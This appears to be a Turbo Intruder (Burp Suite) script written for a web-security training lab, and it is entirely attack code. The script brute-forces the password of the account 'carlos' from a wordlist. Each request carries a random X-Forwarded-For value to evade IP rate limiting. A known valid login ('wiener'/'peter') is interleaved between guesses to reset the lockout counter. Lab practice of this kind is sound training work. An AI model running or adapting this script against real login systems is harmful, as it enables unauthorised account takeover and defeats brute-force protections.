from random import randint

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=5,
                           pipeline=False
                           )
    
    l = []
    for t in open('/home/kali/Desktop/pass.txt'):
            l.append(t)
    for m in range(0,201):
       if m % 2 == 0:
            XFOR = randint(500,10500)
            engine.queue(target.req, [ XFOR, "wiener", "peter"])
       elif m % 2 != 0:
            n = len(l) -1
            XFOR = randint(500,10500)
            engine.queue(target.req, [ XFOR, "carlos", l[n] ])
            l.pop(n)
def handleResponse(req, interesting):
    # currently available attributes are req.status, req.wordcount, req.length and req.response
    if req.status != 404:
        table.add(req)
